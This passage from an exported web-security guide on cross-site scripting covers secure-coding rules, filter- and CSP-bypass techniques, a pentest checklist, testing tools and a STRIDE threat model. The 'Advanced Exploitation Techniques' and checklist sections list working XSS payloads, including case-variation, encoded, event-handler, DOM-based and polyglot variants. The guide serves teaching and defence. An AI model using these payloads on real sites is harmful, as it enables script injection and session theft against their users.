code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">response.set_cookie(
+    &#x27;sessionId&#x27;,
+    value=session_id,
+    httponly=True,
+    secure=True,
+    samesite=&#x27;Strict&#x27;
+)
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80f9-ab0a-f78e82a0db2a"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8007-b92c-cb28541f01d8" class=""><strong>5. Avoid Dangerous Functions</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80d4-938f-fc2b9e096c63" class=""><strong>Rule:</strong> Never use dangerous DOM manipulation functions with user input.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8044-9926-e5d20634b483" class=""><strong>❌ WRONG:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80d3-bdc9-f92ea8a471f0" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">element.innerHTML = userInput;
+element.outerHTML = userInput;
+document.write(userInput);
+eval(userInput);
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8077-b239-f09adb404743" class=""><strong>✅ CORRECT:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80a3-b428-fe37e4c5f3e2" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">element.textContent = userInput;
+const textNode = document.createTextNode(userInput);
+element.appendChild(textNode);
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8033-a970-c0f958b849e6"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-8074-9ea5-fc12344062d6" class=""><strong>Advanced Exploitation Techniques</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8043-886b-cfceec8c2c6b" class=""><strong>1. Bypassing Basic Filters</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-803e-b68a-fbce3a2a8bc6" class=""><strong>Technique: Case Variation</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80bb-a969-f1deb326bba4" class="code code-wrap"><code class="language-HTML" style="white-space:pre-wrap;word-break:break-all">&lt;ScRiPt&gt;alert(&#x27;XSS&#x27;)&lt;/ScRiPt&gt;
+&lt;sCrIpT&gt;alert(&#x27;XSS&#x27;)&lt;/sCrIpT&gt;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-800c-a7a6-f3d22d43da94" class=""><strong>Technique: Encoding</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8062-a081-ce11fb5b4443" class="code code-wrap"><code class="language-HTML" style="white-space:pre-wrap;word-break:break-all">&lt;!-- HTML entities --&gt;
+&amp;lt;script&amp;gt;alert(&#x27;XSS&#x27;)&amp;lt;/script&amp;gt;
+&lt;!-- If decoded before rendering --&gt;
+
+&lt;!-- Unicode encoding --&gt;
+&lt;script&gt;\u0061lert(&#x27;XSS&#x27;)&lt;/script&gt;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8051-89e7-d49ff87b28c4" class=""><strong>Technique: Event Handlers</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-804d-abf4-ffccdb4efbb3" class="code code-wrap"><code class="language-HTML" style="white-space:pre-wrap;word-break:break-all">&lt;img src=x onerror=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;
+&lt;div onclick=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;Click me&lt;/div&gt;
+&lt;svg onload=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;&lt;/svg&gt;
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8048-b26b-cba278eb92a2"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80c8-9ce7-f1320d2231c6" class=""><strong>2. Bypassing CSP</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80a9-a5aa-cf610e4f5deb" class=""><strong>Technique: JSONP Endpoints</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-800c-85ff-d1729f890a46" class="code code-wrap"><code class="language-HTML" style="white-space:pre-wrap;word-break:break-all">&lt;!-- If CSP allows &#x27;unsafe-inline&#x27; or specific domains --&gt;
+&lt;script src=&quot;https://trusted-cdn.com/jsonp?callback=alert&quot;&gt;&lt;/script&gt;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8015-bac8-f954568c82a5" class=""><strong>Technique: Data URIs</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8038-a4d2-f14499253667" class="code code-wrap"><code class="language-HTML" style="white-space:pre-wrap;word-break:break-all">&lt;!-- If CSP allows data: --&gt;
+&lt;iframe src=&quot;data:text/html,&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-803c-b9ab-fc9d3d56ddc5" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-802e-843f-dd049c4fb048" class="bulleted-list"><li style="list-style-type:disc">Use strict CSP</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80ad-860f-dae72f57eec1" class="bulleted-list"><li style="list-style-type:disc">Avoid &#x27;unsafe-inline&#x27; and &#x27;unsafe-eval&#x27;</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80df-8253-f2fa234af3b9" class="bulleted-list"><li style="list-style-type:disc">Whitelist specific sources only</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80e6-8dec-e1444e949249"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-80ed-91e6-f6bc8d259352" class=""><strong>3. DOM-Based XSS Bypass</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8056-ba93-e18f0fd536a0" class=""><strong>Technique: Fragment Identifier</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8025-83cd-c0f2ac85ec6c" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Vulnerable code uses location.hash
+const hash = location.hash.substring(1);
+document.getElementById(&#x27;content&#x27;).innerHTML = hash;
+
+// Attack
+// URL: /page#&lt;img src=x onerror=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8008-ac58-d70c842b4035" class=""><strong>Technique: JSON Parsing</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80fd-88e4-c4af0a37c887" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Vulnerable: parsing JSON and using in DOM
+const data = JSON.parse(userInput);
+document.getElementById(&#x27;name&#x27;).innerHTML = data.name;
+
+// Attack
+// Input: {&quot;name&quot;: &quot;&lt;img src=x onerror=&#x27;alert(1)&#x27;&gt;&quot;}
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8016-af95-c90fea9ea386"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-809e-a085-d9b8ff8d7c25" class=""><strong>4. Polyglot XSS Payloads</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80c5-941f-c3e15f2a5af6" class=""><strong>Technique: Payloads that work in multiple contexts</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8015-8586-ce99ab0fd2a5" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">// Works in HTML, JavaScript, CSS contexts
+javascript:/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;svg/onload=&#x27;/*--&gt;&lt;html */ onmouseover=&#x27;alert(1)&#x27;&gt;&lt;/html&gt;
+</code></pre></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-801c-9f3c-f1afb5ca8e19"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-8045-b68c-cedf577feec9" class=""><strong>Penetration Testing Methodology</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8076-a830-d5b30a6196bf" class=""><strong>XSS Testing Checklist</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-807a-8586-cc0bc5107a5f" class=""><strong>1. Identify Input Points:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8057-8768-d23953b174fc" class="bulleted-list"><li style="list-style-type:disc">URL parameters</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8019-8fd7-cc30074a8977" class="bulleted-list"><li style="list-style-type:disc">POST data</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80e3-a71c-f92b220bac17" class="bulleted-list"><li style="list-style-type:disc">HTTP headers</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8015-8927-c729a0d45881" class="bulleted-list"><li style="list-style-type:disc">Cookies</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80e8-b60e-e43cbb9817d3" class="bulleted-list"><li style="list-style-type:disc">File uploads</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8083-8f2e-fba39f8eb853" class="bulleted-list"><li style="list-style-type:disc">WebSocket messages</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8067-8bc1-d5a9d1d0013b" class=""><strong>2. Test Basic Payloads:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8068-9d08-f16c31832a9a" class="code code-wrap"><code class="language-HTML" style="white-space:pre-wrap;word-break:break-all">&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
+&lt;img src=x onerror=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;
+&lt;svg onload=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-800c-9ccd-ffd676d5db3d" class=""><strong>3. Determine Context:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-806a-95ed-edc29bb6f33f" class="bulleted-list"><li style="list-style-type:disc">HTML body</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8019-9591-f5e2caeebecf" class="bulleted-list"><li style="list-style-type:disc">HTML attributes</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8018-b32b-df93a4b6fced" class="bulleted-list"><li style="list-style-type:disc">JavaScript</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80fd-8fa2-f1dfcb51fc28" class="bulleted-list"><li style="list-style-type:disc">URL</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-808a-bc92-d722aa862e59" class="bulleted-list"><li style="list-style-type:disc">CSS</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8067-80ce-dbe03a065854" class=""><strong>4. Context-Specific Payloads:</strong></p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80d2-8f38-f08b87aed87c" class=""><strong>HTML Context:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8080-bf4d-d6f7b8180e83" class="code code-wrap"><code class="language-HTML" style="white-space:pre-wrap;word-break:break-all">&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8066-801c-ee42fb30c6a4" class=""><strong>Attribute Context:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-804f-987d-c71adec0f605" class="code code-wrap"><code class="language-HTML" style="white-space:pre-wrap;word-break:break-all">&quot; onmouseover=&quot;alert(&#x27;XSS&#x27;)
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8099-a4dd-d05b96701552" class=""><strong>JavaScript Context:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-8064-86ab-e8107d5804f6" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">&#x27;; alert(&#x27;XSS&#x27;); //
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80ae-ae25-ddcfb1a5dab3" class=""><strong>URL Context:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5562ad-76f0-80d8-bde4-d43dea0dc646" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">javascript:alert(&#x27;XSS&#x27;)
+</code></pre></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80ce-b369-ea2ac092cc13" class=""><strong>5. Test Encoding Bypasses:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-803b-9821-f40cca80ee46" class="bulleted-list"><li style="list-style-type:disc">HTML entities</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8087-84c6-c497391365fe" class="bulleted-list"><li style="list-style-type:disc">Unicode encoding</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-805b-b3a8-efaafb965a50" class="bulleted-list"><li style="list-style-type:disc">URL encoding</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8047-a988-f3c5309f6ae1" class="bulleted-list"><li style="list-style-type:disc">Hex encoding</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80e3-b265-fa559b574583" class=""><strong>6. Test Filter Bypasses:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8086-967c-f236a3fb08b4" class="bulleted-list"><li style="list-style-type:disc">Case variation</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80a7-8ba9-db1030380136" class="bulleted-list"><li style="list-style-type:disc">Tag nesting</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80da-9816-e65d5466f024" class="bulleted-list"><li style="list-style-type:disc">Event handlers</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8097-bc9c-c3694b64e56e" class="bulleted-list"><li style="list-style-type:disc">Alternative tags</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-80f5-a17b-ebc7b3133ecb"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8063-bfc3-d0af1c7c42c5" class=""><strong>Testing Tools</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80cb-bb03-cfa655736d06" class=""><strong>1. Burp Suite:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8094-bb58-e10e4ee14990" class="bulleted-list"><li style="list-style-type:disc">Intruder for payload testing</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80d5-875d-f98825ee8ebd" class="bulleted-list"><li style="list-style-type:disc">XSS Validator extension</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-807e-bd07-cb65b5e28764" class="bulleted-list"><li style="list-style-type:disc">Manual testing and validation</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80bf-9778-d1e9c2066c5f" class=""><strong>2. OWASP ZAP:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80a7-b878-d37b86509867" class="bulleted-list"><li style="list-style-type:disc">Automated XSS scanning</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-806b-ae4d-ea95104ca321" class="bulleted-list"><li style="list-style-type:disc">Manual testing tools</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80a6-a7d9-d85784197740" class="bulleted-list"><li style="list-style-type:disc">Reporting</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80b3-8369-edaa4ca89f7d" class=""><strong>3. Browser Developer Tools:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-804b-9ae2-edab8065464e" class="bulleted-list"><li style="list-style-type:disc">Console for testing</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80fc-a182-dcb3f1e73cc5" class="bulleted-list"><li style="list-style-type:disc">Network tab for payload analysis</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-804b-8459-d7c8d720b16b" class="bulleted-list"><li style="list-style-type:disc">Sources for debugging</li></ul></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-8023-8513-eacf30498d71"/></div><div style="display:contents" dir="auto"><h2 id="2d5562ad-76f0-80be-9a68-feb107b61f94" class=""><strong>Threat Modeling (STRIDE Framework)</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8079-8c05-decbcf7d2d12" class=""><strong>Spoofing</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8085-a332-cfb1b50f8673" class=""><strong>Threat:</strong> Attacker spoofs legitimate user via session hijacking.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8091-9663-f038b888109d" class=""><strong>Attack Vectors:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-808b-a461-ea0686ab4bb7" class="bulleted-list"><li style="list-style-type:disc">Steal session cookies via XSS</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8018-aa58-ea2a9a444698" class="bulleted-list"><li style="list-style-type:disc">Impersonate users</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80f6-8034-fa078b0c8ce8" class="bulleted-list"><li style="list-style-type:disc">Gain unauthorized access</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-801a-8cb9-d3d443af7402" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-802b-93ad-cf653bab0de3" class="bulleted-list"><li style="list-style-type:disc">HttpOnly cookies</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8088-aa9b-c7df84da1d48" class="bulleted-list"><li style="list-style-type:disc">Output encoding</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80b2-8dcd-d2ec50476a90" class="bulleted-list"><li style="list-style-type:disc">CSP</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8057-ad3d-c449c618c495" class=""><strong>Risk Rating:</strong> High</p></div><div style="display:contents" dir="auto"><hr id="2d5562ad-76f0-806f-8294-dc971b75c6fa"/></div><div style="display:contents" dir="auto"><h3 id="2d5562ad-76f0-8061-bf73-e7f4028c3b4e" class=""><strong>Tampering</strong></h3></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-805e-b459-d50f7286abaf" class=""><strong>Threat:</strong> Attacker modifies page content or user data.</p></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-8023-933d-dd13cbc9e88c" class=""><strong>Attack Vectors:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8062-9116-d75895968e28" class="bulleted-list"><li style="list-style-type:disc">DOM manipulation</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8078-98ec-fc3c28d8737f" class="bulleted-list"><li style="list-style-type:disc">Form tampering</li></ul></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-8081-afdd-ca14cb0a9c1e" class="bulleted-list"><li style="list-style-type:disc">Content defacement</li></ul></div><div style="display:contents" dir="auto"><p id="2d5562ad-76f0-80e7-8b8a-cab01acca313" class=""><strong>Mitigation:</strong></p></div><div style="display:contents" dir="auto"><ul id="2d5562ad-76f0-80c7-8f07-cc3f6f24a110" 